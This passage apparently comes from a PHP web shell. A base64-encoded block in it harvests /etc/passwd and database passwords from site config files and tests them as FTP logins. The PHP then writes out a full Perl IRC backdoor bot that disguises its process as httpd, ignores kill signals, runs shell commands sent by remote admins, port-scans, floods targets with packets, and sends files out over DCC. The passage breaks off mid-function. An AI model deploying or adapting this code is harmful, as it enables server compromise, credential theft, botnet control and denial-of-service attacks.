TsNCmNvbG9yOiAjZmZmZmZmOw0KfQ0KDQoudHIxIHsNCkJPUkRFUjogMTsNCmNvbG9yOiAjMzMzMzMzOw0KfQ0KdGFibGUgew0KQk9SREVSOiAgI2VlZWVlZSAgb3V0c2V0Ow0KQkFDS0dST1VORC1DT0xPUjogIzAwMDAwMDsNCmNvbG9yOiAjMzMzMzMzOw0KfQ0KdGV4dGFyZWEgew0KQk9SREVSLVJJR0hUOiAgI2ZmZmZmZiAxIHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzk5OTk5OSAxIHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzk5OTk5OSAxIHNvbGlkOw0KQk9SREVSLUJPVFRPTTogI2ZmZmZmZiAxIHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzMzMzMzMzsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2ZmZmZmZjsNCn0NCkJPRFkgew0KbWFyZ2luOiAxOw0KY29sb3I6ICMzMzMzMzM7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KfQ0KQTpsaW5rIHtDT0xPUjpyZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZX0NCkE6dmlzaXRlZCB7IENPTE9SOnJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lfQ0KQTphY3RpdmUge0NPTE9SOnJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lfQ0KQTpob3ZlciB7Y29sb3I6Ymx1ZTtURVhULURFQ09SQVRJT046IG5vbmV9DQoNCjwvU1RZTEU+PGJvZHk+IjsgDQoNCnNldF90aW1lX2xpbWl0KDApOyANCiMjIyMjIyMjIyMjIyMjIyMjIyANCkAkcGFzc3dkPWZvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKTsgDQppZiAoISRwYXNzd2QpIHsgDQogIGVjaG8gIlstXSBFcnJvciA6IGNvdWRuJ3QgcmVhZCAvZXRjL3Bhc3N3ZCI7IA0KICBleGl0OyANCn0gDQokcGF0aF90b19wdWJsaWM9YXJyYXkoKTsgDQokdXNlcnM9YXJyYXkoKTsgDQokcGF0aHRvY29uZj1hcnJheSgpOyANCiRpPTA7IA0KDQp3aGlsZSghZmVvZigkcGFzc3dkKSkgeyANCiRzdHI9ZmdldHMoJHBhc3N3ZCk7IA0KaWYgKCRpPjM1KSB7IA0KICAgJHBvcz1zdHJwb3MoJHN0ciwiOiIpOyANCiAgICR1c2VybmFtZT1zdWJzdHIoJHN0ciwwLCRwb3MpOyANCiAgICRkaXJ6PSIvaG9tZS8kdXNlcm5hbWUvcHVibGljX2h0bWwvIjsgDQogICBpZiAoKCR1c2VybmFtZSE9IiIpKSB7IA0KICAgICAgIGlmIChpc19yZWFkYWJsZSgkZGlyeikpIHsgDQogICAgICAgICAgIGFycmF5X3B1c2goJHVzZXJzLCR1c2VybmFtZSk7IA0KICAgICAgICAgICBhcnJheV9wdXNoKCRwYXRoX3RvX3B1YmxpYywkZGlyeik7IA0KICAgICAgIH0gDQogICB9IA0KfSANCiRpKys7IA0KfSANCiMjIyMjIyMjIyMjIyMjIyMjIyMgDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgDQplY2hvICI8YnI+PGJyPiI7IA0KZWNobyAiPHRleHRhcmVhIG5hbWU9J21haW5fd2luZG93JyBjb2xzPTEwMCByb3dzPTIwPiI7IA0KDQplY2hvICJbK10gRm91bmRlZCAiLnNpemVvZigkdXNlcnMpLiIgZW50cnlzIGluIC9ldGMvcGFzc3dkXG4iOyANCmVjaG8gIlsrXSBGb3VuZGVkICIuc2l6ZW9mKCRwYXRoX3RvX3B1YmxpYykuIiByZWFkYWJsZSBwdWJsaWNfaHRtbCBkaXJlY3Rvcmllc1xuIjsgDQoNCmVjaG8gIlt+XSBTZWFyY2hpbmcgZm9yIHBhc3N3b3JkcyBpbiBjb25maWcuKiBmaWxlcy4uLlxuXG4iOyANCmZvcmVhY2ggKCR1c2VycyBhcyAkdXNlcikgeyANCiAgICAgICAkcGF0aD0iL2hvbWUvJHVzZXIvcHVibGljX2h0bWwvIjsgDQogICAgICAgcmVhZF9kaXIoJHBhdGgsJHVzZXIpOyANCn0gDQoNCmVjaG8gIlxuWytdIERvbmVcbiI7IA0KDQpmdW5jdGlvbiByZWFkX2RpcigkcGF0aCwkdXNlcm5hbWUpIHsgDQogICBpZiAoJGhhbmRsZSA9IG9wZW5kaXIoJHBhdGgpKSB7IA0KICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlID0gcmVhZGRpcigkaGFuZGxlKSkpIHsgDQogICAgICAgICAgICAgJGZwYXRoPSIkcGF0aCRmaWxlIjsgDQogICAgICAgICAgICAgaWYgKCgkZmlsZSE9Jy4nKSBhbmQgKCRmaWxlIT0nLi4nKSkgeyANCiAgICAgICAgICAgICAgICBpZiAoaXNfcmVhZGFibGUoJGZwYXRoKSkgeyANCiAgICAgICAgICAgICAgICAgICAkZHI9IiRmcGF0aC8iOyANCiAgICAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKCRkcikpIHsgDQogICAgICAgICAgICAgICAgICAgICAgcmVhZF9kaXIoJGRyLCR1c2VybmFtZSk7IA0KICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgZWxzZSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkZmlsZT09J2NvbmZpZy5waHAnKSBvciAoJGZpbGU9PSdjb25maWcuaW5jLnBocCcpIG9yICgkZmlsZT09J2RiLmluYy5waHAnKSBvciAoJGZpbGU9PSdjb25uZWN0LnBocCcpIG9yICgkZmlsZT09J3dwLWNvbmZpZy5waHAnKSBvciAoJGZpbGU9PSd2YXIucGhwJykgb3IgKCRmaWxlPT0nY29uZmlndXJlLnBocCcpIG9yICgkZmlsZT09J2RiLnBocCcpIG9yICgkZmlsZT09J2RiX2Nvbm5lY3QucGhwJykpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFzcz1nZXRfcGFzcygkZnBhdGgpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkcGFzcyE9JycpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICJbK10gJGZwYXRoXG4kcGFzc1xuIjsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdHBfY2hlY2soJHVzZXJuYW1lLCRwYXNzKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgfSANCiAgICAgICB9IA0KICAgfSANCn0gDQoNCmZ1bmN0aW9uIGdldF9wYXNzKCRsaW5rKSB7IA0KICAgQCRjb25maWc9Zm9wZW4oJGxpbmssJ3InKTsgDQogICB3aGlsZSghZmVvZigkY29uZmlnKSkgeyANCiAgICAgICAkbGluZT1mZ2V0cygkY29uZmlnKTsgDQogICAgICAgaWYgKHN0cnN0cigkbGluZSwncGFzcycpIG9yIHN0cnN0cigkbGluZSwncGFzc3dvcmQnKSBvciBzdHJzdHIoJGxpbmUsJ3Bhc3N3ZCcpKSB7IA0KICAgICAgICAgICBpZiAoc3RycnBvcygkbGluZSwnIicpKSANCiAgICAgICAgICAgICAgJHBhc3M9c3Vic3RyKCRsaW5lLChzdHJwb3MoJGxpbmUsJz0nKSszKSwoc3RycnBvcygkbGluZSwnIicpLShzdHJwb3MoJGxpbmUsJz0nKSszKSkpOyANCiAgICAgICAgICAgZWxzZSANCiAgICAgICAgICAgICAgJHBhc3M9c3Vic3RyKCRsaW5lLChzdHJwb3MoJGxpbmUsJz0nKSszKSwoc3RycnBvcygkbGluZSwiJyIpLShzdHJwb3MoJGxpbmUsJz0nKSszKSkpOyANCiAgICAgICAgICAgcmV0dXJuICRwYXNzOyANCiAgICAgICB9IA0KICAgfSANCn0gDQoNCmZ1bmN0aW9uIGZ0cF9jaGVjaygkbG9naW4sJHBhc3MpIHsgDQogICAgQCRmdHA9ZnRwX2Nvbm5lY3QoJzEyNy4wLjAuMScpOyANCiAgICBpZiAoJGZ0cCkgeyANCiAgICAgICBAJHJlcz1mdHBfbG9naW4oJGZ0cCwkbG9naW4sJHBhc3MpOyANCiAgICAgICBpZiAoJHJlcykgeyANCiAgICAgICAgICBlY2hvICdbRlRQXSAnLiRsb2dpbi4nOicuJHBhc3MuIiAgU3VjY2Vzc1xuIjsgDQogICAgICAgfSANCiAgICAgICBlbHNlIGZ0cF9xdWl0KCRmdHApOyANCiAgICB9IA0KfSANCg0KZWNobyAiPC90ZXh0YXJlYT48YnI+IjsgDQoNCmVjaG8gIjwvYm9keT48L2h0bWw+IjsgDQo/Pg=";


if(!empty($_POST['ircadmin']) AND !empty($_POST['ircserver']) AND !empty($_POST['ircchanal']) AND !empty($_POST['ircname']))
{
$ircadmin=$_POST['ircadmin'];
$ircserver=$_POST['ircserver'];
$ircchan=$_POST['ircchanal'];
$irclabel=$_POST['ircname'];
echo "<title>OverclockiX Shell-Connector || Connecting to $ircserver<title>";
echo "<body bgcolor=\"black\" text=\"green\">";
echo "Now Connecting to <b><font color=\"red\">$ircserver</font></b> in <b><font color=\"yellow\">$ircchan</font></b> Andministrators: <b><font color=\"yellow\">$ircadmin</font></b> Botname is <b><font color=\"yellow\">$irclabel</font></b>";
echo "<p>Dont Forget to Delete Loader.pl in /tmp</p>";
#######################################################
######################IRC Trojan##########################
$file="
################ CONFIGURACAO #################################################################
my \$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #
#----------------------------------------------################################################
my \$linas_max='48'; # Evita o flood :) depois de X linhas #
#----------------------------------------------################################################
my \$sleep='4'; # ele dorme X segundos #
##################### IRC #####################################################################
my @adms=(\"$ircadmin\"); # Nick do administrador #
#----------------------------------------------################################################
my @canais=(\"$ircchan\"); # Caso haja senha (\"#canal :senha\") #
#----------------------------------------------################################################
my \$nick='$irclabel'; # Nick do bot. Caso esteja em uso vai aparecer #
                                               # aparecer com numero radonamico no final #
#----------------------------------------------################################################
my \$ircname = 'Linux'; # User ID #
#----------------------------------------------################################################
chop (my \$realname = `uname -a`); # Full Name #
#----------------------------------------------################################################
\$servidor='$ircserver' unless \$servidor; # Servidor de irc que vai ser usado #
                                               # caso n?o seja especificado no argumento #
#----------------------------------------------################################################
my \$porta='6667'; # Porta do servidor de irc #
################ ACESSO A SHELL ###############################################################
my \$secv = 1; # 1/0 pra habilita/desabilita acesso a shell #
###############################################################################################
my \$VERSAO = '0.2';
\$SIG{'INT'} = 'IGNORE';
\$SIG{'HUP'} = 'IGNORE';
\$SIG{'TERM'} = 'IGNORE';
\$SIG{'CHLD'} = 'IGNORE';
\$SIG{'PS'} = 'IGNORE';
\$SIG{'STOP'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir(\"/\");
\$servidor=\"\$ARGV[0]\" if \$ARGV[0];
$0=\"\$processo\".\"\0\"x16;;
my \$pid=fork;
exit if \$pid;
die \"Problema com o fork: $!\" unless defined(\$pid);
my \$dcc_sel = new IO::Select->new();
#############################
# B0tchZ na veia ehehe :P #
#############################

\$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my \$socket = \$_[0];
    print \$socket \"\$_[1]\\n\";
  } else {
      print \$IRC_cur_socket \"\$_[0]\\n\";
  }
}
#################################
sub conectar {
   my \$meunick = \$_[0];
   my \$servidor_con = \$_[1];
   my \$porta_con = \$_[2];

   my \$IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"\$servidor_con\", PeerPort=>\$porta_con) or return(1);
   if (defined(\$IRC_socket)) {
     \$IRC_cur_socket = \$IRC_socket;

     \$IRC_socket->autoflush(1);
     \$sel_cliente->add(\$IRC_socket);

     \$irc_servers{\$IRC_cur_socket}{'host'} = \"\$servidor_con\";
     \$irc_servers{\$IRC_cur_socket}{'porta'} = \"\$porta_con\";
     \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
     \$irc_servers{\$IRC_cur_socket}{'meuip'} = \$IRC_socket->sockhost;
     nick(\"\$meunick\");
     sendraw(\"USER \$ircname \".\$IRC_socket->sockhost.\" \$servidor_con :\$realname\");
     sleep 1;
   }
} #####################

my \$line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar(\"\$nick\", \"\$servidor\", \"\$porta\"); }
   delete(\$irc_servers{''}) if (defined(\$irc_servers{''}));
   &DCC::connections;
   my @ready = \$sel_cliente->can_read(0);
   next unless(@ready);
   foreach \$fh (@ready) {
     \$IRC_cur_socket = \$fh;
     \$meunick = \$irc_servers{\$IRC_cur_socket}{'nick'};
     \$nread = sysread(\$fh, \$msg, 4096);
     if (\$nread == 0) {
        \$sel_cliente->remove(\$fh);
        \$fh->close;
        delete(\$irc_servers{\$fh});
     }
     @lines = split (/\\n/, \$msg);

     for(my \$c=0; \$c<= $#lines; \$c++) {
       \$line = \$lines[\$c];
       \$line=\$line_temp.\$line if (\$line_temp);
       \$line_temp='';
       \$line =~ s/\\r$//;
       unless (\$c == $#lines) {
         parse(\"\$line\");
       } else {
           if ($#lines == 0) {
             parse(\"\$line\");
           } elsif (\$lines[\$c] =~ /\\r$/) {
               parse(\"\$line\");
           } elsif (\$line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse(\"\$line\");
           } else {
               \$line_temp = \$line;
           }
       }
      }
   }
}

#########################


sub parse {
   my \$servarg = shift;
   if (\$servarg =~ /^PING \:(.*)/) {
     sendraw(\"PONG :$1\");
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my \$pn=$1; my \$onde = $4; my \$args = $5;
       if (\$args =~ /^\\001VERSION\\001$/) {
         notice(\"\$pn\", \"\\001VERSION ShellBOT-\$VERSAO por 0ldW0lf\\001\");
       }
       if (grep {\$_ =~ /^\Q\$pn\E$/i } @adms) {
         if (\$onde eq \"\$meunick\"){
           shell(\"\$pn\", \"\$args\");
         }
         if (\$args =~ /^(\Q\$meunick\E|\!atrix)\s+(.*)/ ) {
            my \$natrix = $1;
            my \$arg = $2;
            if (\$arg =~ /^\!(.*)/) {
              ircase(\"\$pn\",\"\$onde\",\"\$1\") unless (\$natrix eq \"!atrix\" and \$arg =~ /^\!nick/);
            } elsif (\$arg =~ /^\@(.*)/) {
                \$ondep = \$onde;
                \$ondep = \$pn if \$onde eq \$meunick;
                bfunc(\"\$ondep\",\"$1\");
            } else {
                shell(\"\$onde\", \"\$arg\");
            }
         }
       }
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc(\$meunick)) {
         \$meunick=$4;
         \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       }
   } elsif (\$servarg =~ m/^\:(.+?)\s+433/i) {
       nick(\"\$meunick\".int rand(9999));
   } elsif (\$servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       \$meunick = $2;
       \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       \$irc_servers{\$IRC_cur_socket}{'nome'} = \"$1\";
       foreach my \$canal (@canais) {
         sendraw(\"JOIN \$canal\");
       }
   }
}
##########################

sub bfunc {
  my \$printl = \$_[0];
  my \$funcarg = \$_[1];
  if (my \$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if (\$funcarg =~ /^portscan (.*)/) {
             my \$hostip=\"$1\";
             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");
             my (@aberta, %porta_banner);
             foreach my \$porta (@portas) {
                my \$scansock = IO::Socket::INET->new(PeerAddr => \$hostip, PeerPort => \$porta, Proto => 'tcp', Timeout => 4);
                if (\$scansock) {
                   push (@aberta, \$porta);
                   \$scansock->close;
                }
             }

             if (@aberta) {
               sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :portas abertas: @aberta\");
             } else {
                 sendraw(\$IRC_cur_socket,\"PRIVMSG \$printl :Nenhuma porta aberta foi encontrada\");
             }
           }
           if (\$funcarg =~ /^pacota\s+(.*)\s+(\d+)\s+(\d+)/) {
             my (\$dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");
             \$dtime = 1 if \$dtime == 0;
             my %bytes;
             \$bytes{igmp} = $2 * \$pacotes{igmp};
             \$bytes{icmp} = $2 * \$pacotes{icmp};
             \$bytes{o} = $2 * \$pacotes{o};
             \$bytes{udp} = $2 * \$pacotes{udp};
             \$bytes{tcp} = $2 * \$pacotes{tcp};

             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002 - Status GERAL -\\002\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Tempo\\002: \$dtime\".\"s\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Total pacotes\\002: \".(\$pacotes{udp} + \$pacotes{igmp} + \$pacotes{icmp} + \$pacotes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Total bytes\\002: \".(\$bytes{icmp} + \$bytes {igmp} + \$bytes{udp} + \$bytes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Media de envio\\002: \".int(((\$bytes{icmp}+\$bytes{igmp}+\$bytes{udp} + \$bytes{o})/1024)/\$dtime).\" kbps\");

           }
           exit;
       }
  }
}
##########################


sub ircase {
  my (\$kem, \$printl, \$case) = @_;


  if (\$case =~ /^join (.*)/) {
     j(\"$1\");
   }
   if (\$case =~ /^part (.*)/) {
      p(\"$1\");
   }
   if (\$case =~ /^rejoin\s+(.*)/) {
      my \$chan = $1;
      if (\$chan =~ /^(\d+) (.*)/) {
        for (my \$ca = 1; \$ca <= $1; \$ca++ ) {
          p(\"$2\");
          j(\"$2\");
        }
      } else {
          p(\"\$chan\");
          j(\"\$chan\");
      }
   }
   if (\$case =~ /^op/) {
      op(\"\$printl\", \"\$kem\") if \$case eq \"op\";
      my \$oarg = substr(\$case, 3);
      op(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^deop/) {
      deop(\"\$printl\", \"\$kem\") if \$case eq \"deop\";
      my \$oarg = substr(\$case, 5);
      deop(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^voice/) {
      voice(\"\$printl\", \"\$kem\") if \$case eq \"voice\";
      \$oarg = substr(\$case, 6);
      voice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^devoice/) {
      devoice(\"\$printl\", \"\$kem\") if \$case eq \"devoice\";
      \$oarg = substr(\$case, 8);
      devoice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^msg\s+(\S+) (.*)/) {
      msg(\"$1\", \"$2\");
   }
   if (\$case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf <= $1; \$cf++) {
        msg(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp(\"$1\", \"$2\");
   }
   if (\$case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf <= $1; \$cf++) {
        ctcp(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^invite\s+(\S+) (.*)/) {
      invite(\"$1\", \"$2\");
   }
   if (\$case =~ /^nick (.*)/) {
      nick(\"$1\");
   }
   if (\$case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar(\"$2\", \"$1\", 6667);
   }
   if (\$case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND(\"$1\", \"$2\");
   }
   if (\$case =~ /^raw (.*)/) {
      sendraw(\"$1\");
   }
   if (\$case =~ /^eval (.*)/) {
     eval \"$1\";
   }
}
##########################

sub shell {
  return unless \$secv;
  my \$printl=\$_[0];
  my \$comando=\$_[1];
  if (\$comando =~ /cd (.*)/) {
    chdir(\"$1\") || msg(\"\$printl\", \"Dossier Makayench :D \");
    return;
  }
  elsif (\$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`\$comando 2>&1 3>&1`;
           my \$c=0;
           foreach my \$linha (@resp) {
             \$c++;
             chop \$linha;
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\$linha\");
             if (\$c == \"\$linas_max\") {
               \$c=0;
               sleep \$sleep;
             }
           }
           exit;
       }
  }
}

#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my \$iaddr = inet_aton(\$_[0]);
  my \$msg = 'B' x \$_[1];
  my \$ftime = \$_[2];
  my \$cp = 0;
  my (%pacotes);
  \$pacotes{icmp} = \$pacotes{igmp} = \$pacotes{udp} = \$pacotes{o} = \$pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or \$cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or \$cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or \$cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or \$cp++;
  return(undef) if \$cp == 4;
  my \$itime = time;
  my (\$cur_time);
  while ( 1 ) {
     for (my \$porta = 1; \$porta <= 65535; \$porta++) {
       \$cur_time = time - \$itime;
       last if \$cur_time >= \$ftime;
       send(SOCK1, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{igmp}++;
       send(SOCK2, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{udp}++;
       send(SOCK3, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{icmp}++;
       send(SOCK4, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{tcp}++;

       # DoS ?? :P
       for (my \$pc = 3; \$pc <= 255;\$pc++) {
         next if \$pc == 6;
         \$cur_time = time - \$itime;
         last if \$cur_time >= \$ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, \$pc) or next;
         send(SOCK5, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{o}++;;
       }
     }
     last if \$cur_time >= \$ftime;
  }
  return(\$cur_time, %pacotes);
}

#############
# ALIASES #
#############

sub action {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\\001ACTION \$_[1]\\001\");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\\001\$_[1]\\001\");
}
sub msg {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\$_[1]\");
}

sub notice {
   return unless $#_ == 1;
   sendraw(\"NOTICE \$_[0] :\$_[1]\");
}

sub op {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +o \$_[1]\");
}
sub deop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -o \$_[1]\");
}
sub hop {
    return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub dehop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub voice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +v \$_[1]\");
}
sub devoice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -v \$_[1]\");
}
sub ban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +b \$_[1]\");
}
sub unban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -b \$_[1]\");
}
sub kick {
   return unless $#_ == 1;
   sendraw(\"KICK \$_[0] \$_[1] :\$_[2]\");
}

sub modo {
   return unless $#_ == 0;
   sendraw(\"MODE \$_[0] \$_[1]\");
}
sub mode { modo(@_); }

sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw(\"JOIN \$_[0]\");
}
sub p { part(@_); }
sub part {sendraw(\"PART \$_[0]\");}

sub nick {
  return unless $#_ == 0;
  sendraw(\"NICK \$_[0]\");
}

sub invite {
   return unless $#_ == 1;
   sendraw(\"INVITE \$_[1] \$_[0]\");
}
sub topico {
   return unless $#_ == 1;
   sendraw(\"TOPIC \$_[0] \$_[1]\");
}
sub topic { topico(@_); }

sub whois {
  return unless $#_ == 0;
  sendraw(\"WHOIS \$_[0]\");
}
sub who {
  return unless $#_ == 0;
  sendraw(\"WHO \$_[0]\");
}
sub names {
  return unless $#_ == 0;
  sendraw(\"NAMES \$_[0]\");
}
sub away {
  sendraw(\"AWAY \$_[0]\");
}
sub back { away(); }
sub quit {
  sendraw(\"QUIT :\$_[0]\");
}

# DCC
#########################

package DCC;

sub connections {
   my @ready = \$dcc_sel->can_read(1);
# return unless (@ready);
   foreach my \$fh (@ready) {
     my \$dcctipo = \$DCC{\$fh}{tipo};
     my \$arquivo = \$DCC{\$fh}{arquivo};
     my \$bytes = \$DCC{\$fh}{bytes};
     my \$cur_byte = \$DCC{\$fh}{curbyte};
     my \$nick = \$DCC{\$fh}{nick};


     my \$msg;
     my \$nread = sysread(\$fh, \$msg, 10240);

     if (\$nread == 0 and \$dcctipo =~ /^(get|sendcon)$/) {
        \$DCC{\$fh}{status} = \"Cancelado\";
        \$DCC{\$fh}{ftime} = time;
        \$dcc_sel->remove(\$fh);
        \$fh->close;
        next;
     }

     if (\$dcctipo eq \"get\") {
        \$DCC{\$fh}{curbyte} += length(\$msg);

        my \$cur_byte = \$DCC{\$fh}{curbyte};

        open(FILE, \">> \$arquivo\");
        print FILE \"\$msg\" if (\$cur_byte <= \$bytes);
        close(FILE);

        my \$packbyte = pack(\"N\", \$cur_byte);
        print \$fh \"\$packbyte\";


        if (\$bytes == \$cur_byte) {
           \$dcc_sel->remove(\$fh);
           \$fh->close;
           \$DCC{\$fh}{status} = \"Recebido\";
           \$DCC{\$fh}{ftime} = time;
           next;
        }
     } elsif (\$dcctipo eq \"send\") {
          my \$send = \$fh->accept;
          \$send->autoflush(1);
          \$dcc_sel->add(\$send);
          \$dcc_sel->remove(\$fh);
          \$DCC{\$send}{tipo} = 'sendcon';
          \$DCC{\$send}{itime} = time;
          \$DCC{\$send}{nick} = \$nick;
          \$DCC{\$send}{bytes} = \$bytes;
          \$DCC{\$send}{curbyte} = 0;
          \$DCC{\$send}{arquivo} = \$arquivo;
          \$DCC{\$send}{ip} = \$send->peerhost;
          \$DCC{\$send}{porta} = \$send->peerport;
          \$DCC{\$send}{status} = \"Enviando\";
          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, \"< \$arquivo\");
          my \$fbytes;
          read(FILE, \$fbytes, 1024);
          print \$send \"\$fbytes\";
          close FILE;
# delete(\$DCC{\$fh});
} elsif (\$dcctipo eq 'sendcon') {
          my \$bytes_sended = unpack(\"N\", \$msg);
          \$DCC{\$fh}{curbyte} = \$bytes_sended;
          if (\$bytes_sended == \$bytes) {
             \$fh->close;
             \$dcc_sel->remove(\$fh);
             \$DCC{\$fh}{status} = \"Enviado\";
             \$DCC{\$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, \"< \$arquivo\");
          seek(SENDFILE, \$bytes_sended, 0);
          my \$send_bytes;
          read(SENDFILE, \$send_bytes, 1024);
          print \$fh \"\$send_bytes\";
          close(SENDFILE);
     }
   }
}
##########################

sub SEND {
  my (\$nick, \$arquivo) = @_;
  unless (-r \"\$arquivo\") {
    return(0);
  }

  my \$dccark = \$arquivo;
  \$dccark =~ s/[.*\/](\S+)/$1/;

  my \$meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};
  my \$longip = unpack(\"N\",inet_aton(\$meuip));

  my @filestat = stat(\$arquivo);
  my \$size_total=\$filestat[7];
  if (\$size_total == 0) {
     return(0);
  }

  my (\$porta, \$sendsock);
  do {
    \$porta = int rand(64511);
    \$porta += 1024;
    \$sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>\$porta, Proto => 'tcp') and \$dcc_sel->add(\$sendsock);
  } until \$sendsock;

  \$DCC{\$sendsock}{tipo} = 'send';
  \$DCC{\$sendsock}{nick} = \$nick;
  \$DCC{\$sendsock}{bytes} = \$size_total;
  \$DCC{\$sendsock}{arquivo} = \$arquivo;

  &::ctcp(\"\$nick\", \"DCC SEND \$dccark \$longip \$porta \$size_total\");

}

sub GET {
  my (\$arquivo, \$dcclongip, \$dccporta, \$bytes, \$nick) = @_;
  return(0) if (-e \"\$arquivo\");
  if (open(FILE, \"> \$arquivo\")) {
     close FILE;
  } else {
    return(0);
  }

  my \$dccip=fixaddr(\$dcclongip);
  return(0) if (\$dccporta < 1024 or not defined \$dccip or \$bytes < 1);
  my \$dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\$dccip, PeerPort=>\$dccporta, Timeout=>15) or return (0);
  \$dccsock->autoflush(1);
  \$dcc_sel->add(\$dccsock);
  \$DCC{\$dccsock}{tipo} = 'get';
  \$DCC{\$dccsock}{itime} = time;
  \$DCC{\$dccsock}{nick} = \$nick;
  \$DCC{\$dccsock}{bytes} = \$bytes;
  \$DCC{\$dccsock}{curbyte} = 0;
  \$DCC{\$dccsock}{arquivo} = \$arquivo;
  \$DCC{\$dccsock}{ip} = \$dccip;
  \$DCC{\$dccsock}{porta} = \$dccporta;
  \$DCC{\$dccsock}{status} = \"Recebendo\";
}
############################
# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my \$socket = shift;
  my \$sock_tipo = \$DCC{\$socket}{tipo};
  unless (lc(\$sock_tipo) eq \"chat\") {
